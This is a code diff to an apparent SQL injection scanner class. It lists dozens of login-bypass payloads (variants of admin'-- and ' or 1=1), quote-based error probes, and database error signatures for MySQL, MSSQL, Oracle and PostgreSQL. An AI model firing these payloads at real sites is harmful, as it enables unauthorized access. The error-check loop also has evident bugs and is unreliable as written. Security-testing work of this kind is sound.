@@ -37,63 +37,67 @@ class SQLInjection(object):
 
         # http://www.hacoder.com/2015/10/sql-injection-authentication-bypass-cheat-sheet/
         self.input_data = [
-            ['admin\'--', '123456789'],
-            ['\' or 1=1', '123456789'],
-            [' or 1=1', ''],
-            ['or 1=1--', ''],
-            ['or 1=1#', ''],
-            ['or 1=1/*', ''],
-            ['admin\' #', ''],
-            ['admin\'/*', ''],
-            ['admin\' or \'1\'=\'1', ''],
-            ['admin\' or \'1\'=\'1\'--', ''],
-            ['admin\' or \'1\'=\'1\'#', ''],
-            ['admin\' or \'1\'=\'1\'/*', ''],
-            ['admin\'or 1=1 or \'\'=\'', ''],
-            ['admin\' or 1=1', ''],
-            ['admin\' or 1=1--', ''],
-            ['admin\' or 1=1#', ''],
-            ['admin\' or 1=1/*', ''],
-            ['admin\') or (\'1\'=\'1', ''],
-            ['admin\') or (\'1\'=\'1\'--', ''],
-            ['admin\') or (\'1\'=\'1\'#', ''],
-            ['admin\') or (\'1\'=\'1\'/*', ''],
-            ['admin\') or \'1\'=\'1', ''],
-            ['admin\') or \'1\'=\'1\'--', ''],
-            ['admin\') or \'1\'=\'1\'#', ''],
-            ['admin\') or \'1\'=\'1\'/*', ''],
-            ['admin" --', ''],
-            ['admin" #', ''],
-            ['admin"/*', ''],
-            ['admin" or "1"="1', ''],
-            ['admin" or "1"="1"--', ''],
-            ['admin" or "1"="1"#', ''],
-            ['admin" or "1"="1"/*', ''],
-            ['admin"or 1=1 or ""="', ''],
-            ['admin" or 1=1', ''],
-            ['admin" or 1=1--', ''],
-            ['admin" or 1=1#', ''],
-            ['admin" or 1=1/*', ''],
-            ['admin") or ("1"="1', ''],
-            ['admin") or ("1"="1"--', ''],
-            ['admin") or ("1"="1"#', ''],
-            ['admin") or ("1"="1"/*', ''],
-            ['admin") or "1"="1', ''],
-            ['admin") or "1"="1"--', ''],
-            ['admin") or "1"="1"#', ''],
-            ['admin") or "1"="1"/*', '']
+            'admin\'--',
+            '\' or 1=1',
+            ' or 1=1',
+            'or 1=1--',
+            'or 1=1#',
+            'or 1=1/*',
+            'admin\' #',
+            'admin\'/*',
+            'admin\' or \'1\'=\'1',
+            'admin\' or \'1\'=\'1\'--',
+            'admin\' or \'1\'=\'1\'#',
+            'admin\' or \'1\'=\'1\'/*',
+            'admin\'or 1=1 or \'\'=\'',
+            'admin\' or 1=1',
+            'admin\' or 1=1--',
+            'admin\' or 1=1#',
+            'admin\' or 1=1/*',
+            'admin\') or (\'1\'=\'1',
+            'admin\') or (\'1\'=\'1\'--',
+            'admin\') or (\'1\'=\'1\'#',
+            'admin\') or (\'1\'=\'1\'/*',
+            'admin\') or \'1\'=\'1',
+            'admin\') or \'1\'=\'1\'--',
+            'admin\') or \'1\'=\'1\'#',
+            'admin\') or \'1\'=\'1\'/*',
+            'admin" --',
+            'admin" #',
+            'admin"/*',
+            'admin" or "1"="1',
+            'admin" or "1"="1"--',
+            'admin" or "1"="1"#',
+            'admin" or "1"="1"/*',
+            'admin"or 1=1 or ""="',
+            'admin" or 1=1',
+            'admin" or 1=1--',
+            'admin" or 1=1#',
+            'admin" or 1=1/*',
+            'admin") or ("1"="1',
+            'admin") or ("1"="1"--',
+            'admin") or ("1"="1"#',
+            'admin") or ("1"="1"/*',
+            'admin") or "1"="1',
+            'admin") or "1"="1"--',
+            'admin") or "1"="1"#',
+            'admin") or "1"="1"/*'
         ]
 
-        self.blind_param_data = [
-            'A%\'--',
+        self.error_based_sqli_param_data = [
+            '\'"',
             'A%\' and 1=1--',
             'A%\' and 1=2--'
         ]
 
         # self.serialized_param_data = []
 
+        # https://www.owasp.org/images/5/52/OWASP_Testing_Guide_v4.pdf, page 111.
         self.sql_errors = {
-            'MySQL': 'error in your SQL syntax'
+            'MySQL': 'You have an error in your SQL syntax',
+            'MSSQL': 'Microsoft SQL Native Client error',
+            'Oracle': 'ORA-00933: SQL command not properly ended',
+            'PostgreSQL': 'Query failed: ERROR: syntax error at or near'
         }
 
     def search_injections(self):
@@ -101,11 +105,11 @@ class SQLInjection(object):
             url = self.url_list.get_url()
             if url is None or type(url) is not URL:
                 break
-            self.__sign_in_attempt(url)
-            self.__blind_sqli(url)
+            self.__authentication_attempt(url)
+            self.__error_based_sqli(url)
             # self.__serialized_sqli(url)
 
-    def __sign_in_attempt(self, url):
+    def __authentication_attempt(self, url):
         web = url.get_content()
         forms = web('form')
         for form in forms:
@@ -128,8 +132,8 @@ class SQLInjection(object):
             if input_text_counter == 1 and input_pass_counter == 1:  # Form found.
                 for i in self.input_data:  # Attempting signing in with injection examples.
                     d = {
-                        data[0]: i[0],
-                        data[1]: i[1]
+                        data[0]: i,
+                        data[1]: i
                     }
                     r = requests.post(action, data=urllib.parse.urlencode(d))
                     response = r.text
@@ -138,25 +142,30 @@ class SQLInjection(object):
                         return True  # It is not necessary to keep going, we found an sql injection.
         return False
 
-    def __blind_sqli(self, url):
+    def __error_based_sqli(self, url):
         params = self.__get_parameters(url.get_url())
         domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url.get_url()))
         for x, y in params:
-            for p in self.blind_param_data:
+            for p in self.error_based_sqli_param_data:
                 data = {
                     x: p
                 }
-                r = requests.post(domain, data=urllib.parse.urlencode(data))
+                r = requests.get(domain, data=urllib.parse.urlencode(data))
                 response = r.text
-                for t, e in self.sql_errors:
+                for d, e in self.sql_errors:
                     if e in response.lower():
                         self.__save_results(url, 2)
                         return True
         return False
 
-    def __serialized_sqli(self, url):
+    def __time_based_blind_sqli(self, url):
         # params = self.__get_parameters(url)
         # self.__save_results(url, 3)
+        return False
+
+    def __serialized_sqli(self, url):
+        # params = self.__get_parameters(url)
+        # self.__save_results(url, 4)
         return False
 
     def __get_parameters(self, url):
